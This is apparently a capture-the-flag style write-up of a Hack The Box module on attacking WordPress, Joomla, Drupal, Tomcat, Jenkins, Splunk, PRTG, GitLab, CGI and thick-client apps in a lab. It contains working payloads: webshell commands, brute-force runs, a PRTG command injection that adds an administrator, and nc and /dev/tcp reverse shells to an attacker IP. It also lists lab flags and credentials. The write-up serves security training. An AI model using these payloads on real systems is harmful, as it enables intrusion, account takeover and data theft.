# HTB-Attacking_Common_Applications

## Table of Contents
0. [Tools](#tools)
1. [Setting the Stage](#setting-the-stage)
    1. [Application Discovery & Enumeration](#application-discovery--enumeration-1)
2. [Content Management Systems (CMS)](#content-management-systems-cms-1)
    1. [WordPress - Discovery & Enumeration](#wordpress---discovery--enumeration)
    2. [Attacking WordPress](#attacking-wordpress)
    3. [Joomla - Discovery & Enumeration](#joomla---discovery--enumeration)
    4. [Attacking Joomla](#attacking-joomla)
    5. [Drupal - Discovery & Enumeration](#drupal---discovery--enumeration)
    6. [Attacking Drupal](#attacking-drupal)
3. [Servlet Containers/Software Development](#servlet-containerssoftware-development-1)
    1. [Tomcat - Discovery & Enumeration](#tomcat---discovery--enumeration)
    2. [Attacking Tomcat](#attacking-tomcat)
    3. [Jenkins - Discovery & Enumeration](#jenkins---discovery--enumeration)
    4. [Attacking Jenkins](#attacking-jenkins)
4. [Infrastructure/Network Monitoring Tools](#infrastructurenetwork-monitoring-tools-1)
    1. [Splunk - Discovery & Enumeration](#splunk---discovery--enumeration)
    2. [Attacking Splunk](#attacking-splunk)
    3. [PRTG Network Monitor](#prtg-network-monitor)
5. [Customer Service Mgmt & Configuration Management](#customer-service-mgmt--configuration-management-1)
    1. [osTicket](#osticket)
    2. [GitLab - Discovery & Enumeration](#gitlab---discovery--enumeration)
    3. [Attacking GitLab](#attacking-gitlab)
6. [Common Gateway Interfaces](#common-gateway-interfaces-1)
    1. [Attacking Tomcat CGI](#attacking-tomcat-cgi)
    2. [Attacking Common Gateway Interface (CGI) Applications - Shellshock](#attacking-common-gateway-interface-cgi-applications---shellshock)
7. [Thick Client Applications](#thick-client-applications-1)
    1. [Attacking Thick Client Applications](#attacking-thick-client-applications)
    2. [Exploiting Web Vulnerabilities in Thick-Client Applications](#exploiting-web-vulnerabilities-in-thick-client-applications)

## Tools
### Application Discovery & Enumeration
- Nmap
- eyewitness
- nessus
- aquatone
### Content Management Systems (CMS)
- wpscan
- [wpDiscuz.py](https://www.exploit-db.com/exploits/49967)
- droopescan
- [joomla-brute.py](https://github.com/ajnik/joomla-bruteforce/blob/master/joomla-brute.py)
- [CVE-2019-10945.py](https://raw.githubusercontent.com/dpgg101/CVE-2019-10945/main/CVE-2019-10945.py)
- [drupalgeddon.py](https://www.exploit-db.com/exploits/34992)
### Servlet Containers/Software Development
- [cmd.jsp](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)
### Infrastructure/Network Monitoring Tools
- [reverse_shell_splunk](https://github.com/0xjpuff/reverse_shell_splunk.git)
- evil-winrm
### Customer Service Mgmt & Configuration Management
- [gitlab_userenum.py](https://raw.githubusercontent.com/dpgg101/GitLabUserEnum/refs/heads/main/gitlab_userenum.py)
- [gitlab_13_10_2_rce.py](https://www.exploit-db.com/exploits/49951)
### Common Gateway Interfaces
- ffuf
### Thick Client Applications
- Procmon64.exe
- dnSpy
- de4dot
- x64dbg

## Setting the Stage
### Application Discovery & Enumeration
#### Challenges
1. Use what you've learned from this section to generate a report with EyeWitness. What is the name of the .db file EyeWitness creates in the inlanefreight_eyewitness folder? (Format: filename.db)

    First, we need to set up our /etc/hosts file. We can do this by running the following command:

    ```bash
    IP=10.129.42.195
    printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local drupal-dev.inlanefreight.local drupal-qa.inlanefreight.local drupal-acc.inlanefreight.local drupal.inlanefreight.local" | sudo tee -a /etc/hosts
    ```

    Because **eyewitness** tool requires .xml output from **nmap** tool, we need to run **nmap** first. We run **nmap** against all the hosts in our scope list.

    ```txt
    app.inlanefreight.local
    dev.inlanefreight.local
    drupal-dev.inlanefreight.local
    drupal-qa.inlanefreight.local
    drupal-acc.inlanefreight.local
    drupal.inlanefreight.local
    blog.inlanefreight.local
    ```

    ```bash
    sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
    ```
    Once we have our .xml file, we can run eyewitness to generate a report.

    ```bash
    eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
    ```

    The .db file will be in the inlanefreight_eyewitness folder. The answer is `ew.db`.

2. What does the header on the title page say when opening the aquatone_report.html page with a web browser? (Format: 3 words, case sensitive)

    Similar with eyewitness, aquatone requires .xml output from nmap. Once we have our .xml file, we can run aquatone to generate a report.

    ```bash
    cat web_discovery.xml | aquatone -nmap
    ```
    Once we have our report, we can open the aquatone_report.html page with a web browser. The answer is `Pages by Similarity`.


## Content Management Systems (CMS)
### WordPress - Discovery & Enumeration
#### Challenges
1. Enumerate the host and find a flag.txt flag in an accessible directory.

    We need to make sure that this host is running WordPress. We can do this by running the following command:

    ```bash
    curl -s http://blog.inlanefreight.local | grep WordPress
    ```

    ![alt text](<Assets/WordPress - Discovery & Enumeration - 1.png>)

    We can see that this host is running WordPress. Then, we can use **wpscan**  to enumerate the host.

    ```bash
    sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <SNIP>
    ```
    ![alt text](<Assets/WordPress - Discovery & Enumeration - 2.png>)

    We can see that upload directory is accessible in the **wp-content/uploads/** endpoint. We can visit it in our web browser and doing some exploration. The flag.txt is in the [http://blog.inlanefreight.local/wp-content/uploads/2021/08/flag.txt](http://blog.inlanefreight.local/wp-content/uploads/2021/08/flag.txt). The answer is `0ptions_ind3xeS_ftw!`.

2. Perform manual enumeration to discover another installed plugin. Submit the plugin name as the answer (3 words).

    In the wpscan result, `Plugin(s) Identified:` section, it only shows two plugins. There are contact-form-7 and mail-masta. I tried read available plugins from the source code, by using **curl** command.

    ```bash
    curl -s http://blog.inlanefreight.local/ | grep plugins
    ```
    ![alt text](<Assets/WordPress - Discovery & Enumeration - 3.png>)

    We can see that the output still same with wpscan result. So maybe we need to enumerate the other pages to find the hint. We can click the post section in the website. It will redirect us to another page. We can enumerate the plugins in the page.

    ```bash
    curl -s http://blog.inlanefreight.local/\?p\=1 | grep plugins
    ```

    ![alt text](<Assets/WordPress - Discovery & Enumeration - 4.png>)

    We can see that there are more plugins in the page. The answer is `wp sitemap page`.

3. Find the version number of this plugin. (i.e., 4.5.2)

    The hint says that we need to find readme.txt file to get the plugin version. 

    ![alt text](<Assets/WordPress - Discovery & Enumeration - 5.png>)

    The other plugin has readme.txt file in the under plugin directory. It looks like this,

    ```txt
    http://blog.inlanefreight.local/wp-content/plugins/<plugin_name>/readme.txt
    ```
    So maybe we can try to get the readme.txt file under wp-sitemap-page plugin.

    ```bash
    curl -s http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/readme.txt
    ```
    ![alt text](<Assets/WordPress - Discovery & Enumeration - 6.png>)

    We can see that the version number from the output. The answer is `1.6.4`.

### Attacking WordPress
#### Challenges
1. Perform user enumeration against http://blog.inlanefreight.local. Aside from admin, what is the other user present?

    We can use **wpscan** to solve this.

    ```bash
    sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <SNIP>
    ```
    The answer is `doug`.

2. Perform a login bruteforcing attack against the discovered user. Submit the user's password as the answer.

    We can use **wpscan** with `--multicall-max-passwords` and `-t` flag to increase the bruteforce speed.

    ```bash
    sudo wpscan --password-attack xmlrpc -t 100 --multicall-max-passwords 1000 -U doug -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
    ```
    ![alt text](<Assets/Attacking WordPress - 1.png>)

    The answer is `jessica1`.

3. Using the methods shown in this section, find another system user whose login shell is set to /bin/bash.

    To solve this, we need to read **/etc/passwd** file to know which system user whose login shell is set to /bin/bash. We can accomplish this by using the vuln of **mail-masta** plugin. I have saved the wpscan enumeration output. 

    ![alt text](<Assets/Attacking WordPress - 2.png>)

    Based on that, **mail-masta** plugin has Local FIle Inclusion (LFI) vuln that make us can read files on the server without login.

    ```bash
    curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php\?pl\=/etc/passwd | grep /bin/bash
    ```

    ![alt text](<Assets/Attacking WordPress - 3.png>)
    
    The answer is `webadmin`.


4. Following the steps in this section, obtain code execution on the host and submit the contents of the flag.txt file in the webroot.

    In the previous plugin enumeration output, we can see that this website is using version 7.0.4 wpDiscuz plugin. This plugin has RCE vuln without authentication. We can use [this PoC](https://www.exploit-db.com/exploits/49967) to gain RCE.

    ```bash
    python3 wpDiscuz.py -u http://blog.inlanefreight.local -p /\?p\=1
    curl -s http://blog.inlanefreight.local/wp-content/uploads/2026/01/xcuzuemugrnqtky-1767850072.4547.php\?cmd\=id
    ```

    ![alt text](<Assets/Attacking WordPress - 4.png>)

    We can execute the command by using curl. We can find the flag filename by using this and read it:

    ```bash
    curl -s "http://blog.inlanefreight.local/wp-content/uploads/2026/01/xcuzuemugrnqtky-1767850072.4547.php?cmd=ls%20/var/www/blog.inlanefreight.local/"

    curl -s "http://blog.inlanefreight.local/wp-content/uploads/2026/01/xcuzuemugrnqtky-1767850072.4547.php?cmd=cat%20/var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt"
    ```

    The answer is `l00k_ma_unAuth_rc3!`.

### Joomla - Discovery & Enumeration
#### Challenges
1. Fingerprint the Joomla version in use on http://app.inlanefreight.local (Format: x.x.x)

    We can solve this by using **droopescan** tool to enumerate joomla.

    ```bash
    droopescan scan joomla --url http://app.inlanefreight.local
    ```
    The answer is `3.10.0`.

2. Find the password for the admin user on http://app.inlanefreight.local

    We can bruteforce by using this [script](https://github.com/ajnik/joomla-bruteforce/blob/master/joomla-brute.py)

    ```bash
    sudo python3 joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
    ```
    The answer is `turnkey`.

### Attacking Joomla
#### Challenges
1. Leverage the directory traversal vulnerability to find a flag in the web root of the http://dev.inlanefreight.local/ Joomla application

    First, we need to enumerate the vhost.

    ```bash
    droopescan scan joomla --url http://dev.inlanefreight.local
    ```
    ![alt text](<Assets/Attacking Joomla - 2.png>)

    Based on that, joomlah has vuln of **Directory Traversal / Authenticated Arbitrary File Deletion** for the **1.5.0 - 3.9.4** version. We can use this [script](https://github.com/dpgg101/CVE-2019-10945/blob/main/CVE-2019-10945.py) to exploit that vuln. But to use the script, we need to know the path of admin directory, username, and admin password. We can use **joomlascan.py** to find the admin directory.
    
    ```bash
    python2.7 joomlascan.py -u http://dev.inlanefreight.local
    ```
    ![alt text](<Assets/Attacking Joomla - 1.png>)

    We can see that it has **/administrator** directory. Now, we need to find the username and admin password.

    ```bash
    sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
    ```
    The result is `admin:admin`. Now, we can use the script to exploit the vuln.

    ```bash
    python CVE-2019-10945.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /  
    ``` 

    ![alt text](<Assets/Attacking Joomla - 3.png>)

    Then, we can use curl to read it.

    ```bash
    curl -s http://dev.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt
    ```
    The answer is `j00mla_c0re_d1rtrav3rsal!`.

### Drupal - Discovery & Enumeration
#### Challenges
1. Identify the Drupal version number in use on http://drupal-qa.inlanefreight.local

    We can use **droopescan** to enumerate Drupal.

    ```bash
    droopescan scan drupal -u http://drupal-qa.inlanefreight.local
    ```
    The answer is `7.30`.

### Attacking Drupal
#### Challenges
1. Work through all of the examples in this section and gain RCE multiple ways via the various Drupal instances on the target host. When you are done, submit the contents of the flag.txt file in the /var/www/drupal.inlanefreight.local directory.

    Based on the enumeration result, http://drupal-qa.inlanefreight.local, is using Drupal with 7.30 version. This version has SQL Injection vuln. We can use **metasploit** with **multi/http/drupal_drupageddon** module to gain reverse shell.

    ```bash
    [msf](Jobs:0 Agents:0) >> use exploit/multi/http/drupal_drupageddon
    [*] No payload configured, defaulting to php/meterpreter/reverse_tcp
    [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set lhost 10.10.14.101
    lhost => 10.10.14.101
    [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set rhosts 10.129.95.229
    rhosts => 10.129.95.229
    [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set vhost drupal-qa.inlanefreight.local
    vhost => drupal-qa.inlanefreight.local
    [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set payload php/reverse_php
    payload => php/reverse_php
    [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> exploit
    ```
    ![alt text](<Assets/Attacking Drupal - 1.png>)

    We can see that we have been successful getting shell session. Now, we can read the flag. The answer is `DrUp@l_drUp@l_3veryWh3Re!`.

## Servlet Containers/Software Development
### Tomcat - Discovery & Enumeration
#### Challenges
1. What version of Tomcat is running on the application located at http://web01.inlanefreight.local:8180?

    We can solve this by visiting **/docs** from the default tomcat configuration. By default, **/docs** page will show the version of tomcat.

    ```bash
    curl -s http://web01.inlanefreight.local:8180/docs/ | grep Tomcat
    ```
    The answer is `10.0.10`.

2. What role does the admin user have in the configuration example?

    We can find this by reading `tomcat-users.xml` snipset code in the HTB module. The answer is `admin-gui`.

### Attacking Tomcat
#### Challenges
1. Perform a login bruteforcing attack against Tomcat manager at http://web01.inlanefreight.local:8180. What is the valid username?

    We can use **metasploit** to bruteforce the username and password.

    ```bash
    [msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set VHOST web01.inlanefreight.local
    VHOST => web01.inlanefreight.local
    [msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set RPORT 8180
    RPORT => 8180
    [msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set stop_on_success true
    stop_on_success => true
    [msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set rhosts 10.129.230.35
    rhosts => 10.129.230.35
    [msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> run
    ```
    ![alt text](<Assets/Attacking Tomcat - 1.png>)

    We can see that the valid username is `tomcat`.

2. What is the password?

    Based on the previous bruteforce attack, we can see that the valid password is `root`.

3. Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat_flag.txt

    Because we have the valid username and password, we can try to test it to login to the manager page (`http://web01.inlanefreight.local:8180/manager/html`). I have tried it and it works. So, we can try WAR File Upload to gain RCE. We can prepare the payload.

    ```bash
    wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
    zip -r backup.war cmd.jsp
    ```
    Then, we can upload the backup.war file. 

    ![alt text](<Assets/Attacking Tomcat - 2.png>)

    We can see that the file has been uploaded. Now, we can test it by using curl.

    ```bash
    curl http://web01.inlanefreight.local:8180/backup/cmd.jsp\?cmd\=id
    ```
    ![alt text](<Assets/Attacking Tomcat - 3.png>)

    We can see that id command is work. Now, we can search the flag file. After doing some exploration, the flag file is in `/opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt` directory. We can read it by using curl.

    ```bash
    curl http://web01.inlanefreight.local:8180/backup/cmd.jsp\?cmd\=cat%20/opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt
    ```
    The answer is `t0mcat_rc3_ftw!`.
    
### Jenkins - Discovery & Enumeration
#### Challenges
1. Log in to the Jenkins instance at http://jenkins.inlanefreight.local:8000. Browse around and submit the version number when you are ready to move on.

    We can login by the given credentials. After doing some exploration, we can find the jenkins version in the **/manage** endpoint.

    ![alt text](<Assets/Jenkins - Discovery & Enumeration - 1.png>)

    The answer is `2.303.1`.

### Attacking Jenkins
#### Challenges
1. Attack the Jenkins target and gain remote code execution. Submit the contents of the flag.txt file in the /var/lib/jenkins3 directory

    We can solve this by visiting **/script** endpoint to access script console. We can read the flag in there.

    ```groovy
    def cmd = 'cat /var/lib/jenkins3/flag.txt'
    def sout = new StringBuffer(), serr = new StringBuffer()
    def proc = cmd.execute()
    proc.consumeProcessOutput(sout, serr)
    proc.waitForOrKill(1000)
    println sout
    ```
    The answer is `f33ling_gr00000vy!`.

## Infrastructure/Network Monitoring Tools
### Splunk - Discovery & Enumeration
#### Challenges
1. Enumerate the Splunk instance as an unauthenticated user. Submit the version number to move on (format 1.2.3).

    First, we can do enumeration by using nmap.

    ```bash
    sudo nmap -sV 10.129.91.145
    ```
    ![alt text](<Assets/Splunk - Discovery & Enumeration - 1.png>)

    Based on that, splunk is running in the port 8000 and 8089. We can try to visit port 8000.

    ![alt text](<Assets/Splunk - Discovery & Enumeration - 2.png>)

    We can see the splunk version in the tab. The answer is `8.2.2`.

### Attacking Splunk
#### Challenges
1. Attack the Splunk target and gain remote code execution. Submit the contents of the flag.txt file in the c:\loot directory.

    We can use this [repository](https://github.com/0xjpuff/reverse_shell_splunk.git) to gain reverse shell. This repository contain several files.

    - bin/run.ps1   : This is the main script to gain reverse shell in windows target host.
    - bin/run.bat   : This file will run when the application is deployed and execute the PowerShell one-liner
    - bin/rev.py    : This is the main script to gain reverse shell in linux target host.
    - default/inputs.conf : This file will tell Splunk to execute which file and the condition.

    Because we the target host is windows, based on the nmap output, we need to edit `/bin/run.ps1` to change the IP address and port. Then, we can create a tarball.

    ```bash
    tar -cvzf updater.tar.gz reverse_shell_splunk
    ```
    Then, we can upload the file in the **https://10.129.91.145:8000/en-US/manager/search/apps/local** endpoint. But before we upload the tarball, we need to prepare the listener on our host.

    ```bash
    sudo nc -lnvp 443
    ```
    ![alt text](<Assets/Attacking Splunk - 1.png>)

    The answer is `l00k_ma_no_AutH!`.

### PRTG Network Monitor
#### Challenges
1. What version of PRTG is running on the target?

    In the [Splunk - Discovery & Enumeration](#splunk---discovery--enumeration) we had run nmap to enumerate the target host. We can see that PRTG version is `18.1.37.13946`.

2. Attack the PRTG target and gain remote code execution. Submit the contents of the flag.txt file on the administrator Desktop.

    PRTG 18.1.37.13946 has Command Injection Vulnerability. When we add notification, in the parameter of execute program section, the parameter field will be passed to the powershell without sanitazion and executed it with SYSTEM level. We can use this vuln to add user and grant them Administrator role. So to do this, we need to login to the PRTG page (http://10.129.91.145:8080). We can use the same credential like in the module, `prtgadmin:Password123`. Once we have logged in, we can go to setup -> Account Settings -> Notifications -> Add Notification. Then, we can fill the field like this:

    ![alt text](<Assets/PRTG Network Monitor - 1.png>)

    ![alt text](<Assets/PRTG Network Monitor - 2.png>)

    We used this payload in the parameter section.

    ```txt
    test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
    ```
    After that, click save and run notification test. Then, we can test to login by using `evil-winrm`.

    ```bash
    evil-winrm -i 10.129.91.145 -u prtgadm1 -p 'Pwn3d_by_PRTG!'
    ```
    ![alt text](<Assets/PRTG Network Monitor - 3.png>)

    The answer is `WhOs3_m0nit0ring_wH0?`.

## Customer Service Mgmt & Configuration Management
### osTicket
#### Challenges
1. Find your way into the osTicket instance and submit the password sent from the Customer Support Agent to the customer Charles Smithson .

    After doing some exploration, i realized that the module and the challenge is using same instance. So, we can use the credential, `kevin@inlanefreight.local:Fish1ng_s3ason!`,based on the module dehashed.py result. We can login to the agent page in the `http://support.inlanefreight.local/scp/`. Once we have logged in, we can go to user tab and click on `Charles Smithson`. We will find this conversation:

    ![alt text](<Assets/osTicket - 1.png>)

    The answer is `Inlane_welcome!`.

### Gitlab - Discovery & Enumeration
#### Challenges
1. Enumerate the GitLab instance at http://gitlab.inlanefreight.local. What is the version number?

    To solve this, we need to register and then logged in. Once we have logged in, we can go to `/help` endpoint. The answer is `13.10.2`.

2. Find the PostgreSQL database password in the example project.

    After doing some exploration, we can find the database password in the `inlanefreight-dev` project. In there, open the `phpunit_pgsql.xml` file.

    ![alt text](<Assets/Gitlab - Discovery & Enumeration - 1.png>)

    The answer is `postgres`.

### Attacking GitLab
#### Challenges
1. Find another valid user on the target GitLab instance.

    We can use this [script](https://raw.githubusercontent.com/dpgg101/GitLabUserEnum/refs/heads/main/gitlab_userenum.py) with wordlist from [here](/usr/share/metasploit-framework/data/wordlists/unix_users.txt).

    ```bash
    python3 gitlab_userenum.py --url http://gitlab.inlanefreight.local:8081/ --wordlist /usr/share/metasploit-framework/data/wordlists/unix_users.txt
    ```
    ![alt text](<Assets/Attacking GitLab - 1.png>)

    The answer is `demo`.

2. Gain remote code execution on the GitLab instance. Submit the flag in the directory you land in.

    Our gitlab instance is using **13.10.2** which has remote code execution vulnerability. We can use this [script](https://www.exploit-db.com/exploits/49951) to exploit this vuln. To use this script, we need to prepare the listener on our host. Also, we need valid credential. In the previous [module](#gitlab---discovery--enumeration), we can register a user. So, we can use the credential to run the script.

    ```bash
    sudo nc -lnvp 8443
    ```
    In the other terminal, run the script.

    ```bash
    python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u MrWhok -p abc -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.131 8443 >/tmp/f '
    ```
    ![alt text](<Assets/Attacking GitLab - 2.png>)
    
    The answer is `s3cure_y0ur_Rep0s!`.

## Common Gateway Interfaces
### Attacking Tomcat CGI
#### Challenges
1. After running the URL Encoded 'whoami' payload, what user is tomcat running as?

    The main contain of the module is about tomcat cgi exploitaion with command injection. There are several condition to make this exploitation work.

    - Operating System: The server must be running on Windows
    - Configuration: The setting enableCmdLineArguments must be set to true in the CGI configuration.
    - Version: The Tomcat version must be one of the affected ranges:
        1. 9.0.0.M1 to 9.0.17
        2. 8.5.0 to 8.5.39
        3. 7.0.0 to 7.0.93
    
    So, in here, we need to enumerate the target host to check the condition.

    ```bash
    nmap -sV -p135,139,445,5985,47001,8080  10.129.205.30
    ```
    ![alt text](<Assets/Attacking Tomcat CGI - 1.png>)

    Based on the output, we can see that the target host is running on Windows and the version is 9.0.17 which is in the affected range. How about the configuration? we dont know yet. Also, we dont know if it has CGI or not. We can use **ffuf** to find the CGI script.

    ```bash
    ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.205.30:8080/cgi/FUZZ.bat -t 500
    ```
    ![alt text](<Assets/Attacking Tomcat CGI - 2.png>)

    We found the CGI script. Now, we can use this CGI script to execute command. We can use **curl** to do this.

    ```bash
    curl -s http://10.129.205.30:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
    ```
    ![alt text](<Assets/Attacking Tomcat CGI - 3.png>)
    
    The answer is `feldspar\omen`.

### Attacking Common Gateway Interface (CGI) Applications - Shellshock
#### Challenges
1. Enumerate the host, exploit the Shellshock vulnerability, and submit the contents of the flag.txt file located on the server.

    The main content of this module is about exploiting Shellshock vulnerability via cgi. There are several condition to make this exploitation work.

    - The Server must use CGI (Common Gateway Interface)
    - The Script must invoke Bash
    - The Bash Version must be Vulnerable
    - Data must be passed to Environment Variables

    We can use **ffuf** to enumerate to make sure that this server has cgi script/using cgi.

    ```bash
    ffuf -w /usr/share/wordlists/dirb/small.txt -u http://10.129.205.27/cgi-bin/FUZZ.cgi -t 500
    ```
    ![alt text](<Assets/Attacking Common Gateway Interface (CGI) Applications - Shellshock - 1.png>)

    We found `/access.cgi` in there. Then, we can confirm the vuln by using this payload.

    ```bash
    curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.205.27/cgi-bin/access.cgi
    ```
    ![alt text](<Assets/Attacking Common Gateway Interface (CGI) Applications - Shellshock - 2 .png>)

    We can see that the server is vulnerable. Now, we can use this vulnerability to get reverse shell. We can set up the listener.

    ```bash
    sudo nc -lvnp 7777
    ```
    Then, we can use this payload to get reverse shell.

    ```bash
    curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.131/7777 0>&1' http://10.129.205.27/cgi-bin/access.cgi
    ```
    ![alt text](<Assets/Attacking Common Gateway Interface (CGI) Applications - Shellshock - 3.png>)

    The answer is `Sh3ll_Sh0cK_123`.

## Thick Client Applications
### Attacking Thick Client Applications
1. Perform an analysis of C:\Apps\Restart-OracleService.exe and identify the credentials hidden within its source code. Submit the answer using the format username:password.

    First, we need to rdp to the target.

    ```bash
    xfreerdp /v:10.129.228.115 /u:cybervaca /p:"&aue%C)}6g-d{w" /cert:ignore /dynamic-resolution /drive:parrotshare,/mnt/parrotshare
    ```
    To solve this, there are several steps.

    1. Behavioral Analysis (The Discovery)

        We use **Procmon64.exe** tool to analyze the behavior of Restart-OracleService.exe. Once we have opened **Procmon64.exe**:
            - click capture icon to stop capturing 
            - Click clear icon to erase captured service
            - Click the filter icon
            - Add a rule: Process Name is Restart-OracleService.exe then Include. It will be look like this.

        ![alt text](<Assets/Attacking Thick Client Applications - 1.png>)
        
        Once we have applied the the filter/rule, we can click capture button again to start capturing and run `Restart-OracleService.exe`.

        ![alt text](<Assets/Attacking Thick Client Applications - 2.png>)

        We can see that after the program is executed, it will create a file and delete it immedietly. The location is in **C:\Users\cybervaca\AppData\Local\Temp** folder. We need to prevent the deletion to analzye the file.

    2. Preventing deletion ( Change Folder Permissions)

        To prevent the deletion, we need to change the folder **C:\Users\cybervaca\AppData\Local\Temp** permission. So, the service just created cant be deleted. Here the steps to do this.

            - Visit C:\Users\cybervaca\AppData\Local\Temp
            - Then click Properties -> Security -> Advanced -> cybervaca -> Disable inheritance -> Convert inherited permissions into explicit permissions on this object -> Edit -> Show advanced permissions
            - Deselect Delete and the Delete subfolders and files checkboxes.

        It will look like this.

        ![alt text](<Assets/Attacking Thick Client Applications - 3.png>)
    
    3. Extraction (The Batch Script)

        Now, we need to run the `Restart-OracleService.exe` again. 

        ![alt text](<Assets/Attacking Thick Client Applications - 4.png>)

        As expected, the bat file is not deleted immedietly. Here the content of D81F.bat.

        ![alt text](<Assets/Attacking Thick Client Applications - 5.png>)

        Based on that, It deletes the temporary files (monta.ps1, oracle.txt). Maybe to hide the evidence? We can modify D81F.bat to prevent the deletion. We can delete these lines:

        ```bat
        if %username% == cybervaca goto correcto
        if %username% == frankytech goto correcto
        if %username% == ev4si0n goto correcto
        goto error

        powershell.exe -exec bypass -file c:\programdata\monta.ps1
        del c:\programdata\monta.ps1
        del c:\programdata\oracle.txt
        c:\programdata\restart-service.exe
        del c:\programdata\restart-service.exe
        :error
        ```
        Once we have saved the modification .bat file, we can run the .bat file.

        ![alt text](<Assets/Attacking Thick Client Applications - 6.png>)

        We can go to `c:\programdata`. We will find `monta.ps1` and `oracle.txt`. Here the content of `montas.ps1`.

        ```powershell
         $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida))      
        ```
        This PowerShell script (monta.ps1) is the "assembler." It takes the raw text data created by the batch file and turns it back into a functional executable program (restart-service.exe).

        ![alt text](<Assets/Attacking Thick Client Applications - 7.png>)

        By executing monta.ps1 we get restart-service.exe. We can analyze this file.

    4. Unpacking (The Memory Dump)

        Now, we can use **x64dbg** with Options -> Preferences and only check Exit Breakpoint option. This will make x64dbg to start directly from the application's exit point. This will avoid going through any dll files that are loaded before the app starts. We need to restart x64dbg. Then, we can open restart-service.exe in the x64dbg. After that, we need right click in the cpu session and select Follow in Memory Map. 


        ![alt text](<Assets/Attacking Thick Client Applications - 8.png>)

        We found interesting result. Why it is interesting?

            - MAP Type : Instead of running code directly, the wrapper creates a special chunk of memory that acts like a virtual file on the disk. This is called a Memory Mapped File.
            - -RW-- Protection: The wrapper has to write the hidden code into this memory space. If the memory was "Read Only" (-R---) or "Execute" (--X--), the wrapper wouldn't be able to "unpack" or copy the payload there. It must be Writable (W) during this phase.
            - Size Approx 3000 : This is a typical size for a small, custom-made hacking tool or script (like a credential dumper). It's big enough to contain code but small enough to be a simple utility.

        Once we have clicked it, we will see **MZ** magic bytes in there.

        ![alt text](<Assets/Attacking Thick Client Applications - 9.png>)

        What is MZ magic bytes means? We found hidden executable. Then right-click that row in the Memory Map -> Dump Memory to File. Save it as restart-service_00000000001F0000.bin.
    
    5. Static Analysis (Finding Credentials)

        Now, we can analyze the .bin result by using **strings** tool to find interesting result.

        ```powershell
        .\strings64.exe  C:\Users\cybervaca\Desktop\restart-service_00000000001F0000.bin
        ```

        ![alt text](<Assets/Attacking Thick Client Applications - 10.png>)

        We found .NET executable in there. Now, we can use **De4Dot** to reverse .NET executable.

        ```powershell
        .\de4dot.exe C:\Users\cybervaca\Desktop\restart-service_00000000001F0000.bin
        ```
        Then, we can open the result og de4dot by using **dnSpy**.

        ![alt text](<Assets/Attacking Thick Client Applications - 11.png>)

        We can see the username and password is `svc_oracle:#oracle_s3rV1c3!2010`.
    
### Exploiting Web Vulnerabilities in Thick-Client Applications
#### Challenges
1. What is the IP address of the eth0 interface under the ServerStatus -> Ipconfig tab in the fatty-client application?

    We need to do like in the module. There are several steps:

    1. Fix the Connection Port

        The client attempts to connect on port 8000, but the server is on 1337. We need to find which files that contain port 8000.

        ```powershell
        ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List
        ```
        We will found out that `beans.xml` contain string 8000. Here the content of it.

        ```xml
        <?xml version = "1.0" encoding = "UTF-8"?>

        <beans xmlns="http://www.springframework.org/schema/beans"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="
                        http://www.springframework.org/schema/beans
                        spring-beans-3.0.xsd">

        <!-- Here we have an constructor based injection, where Spring injects required arguments inside the
                constructor function. -->
        <bean id="connectionContext" class = "htb.fatty.shared.connection.ConnectionContext">
            <constructor-arg index="0" value = "server.fatty.htb"/>
            <constructor-arg index="1" value = "8000"/>
        </bean>

        <!-- The next to beans use setter injection. For this kind of injection one needs to define an default
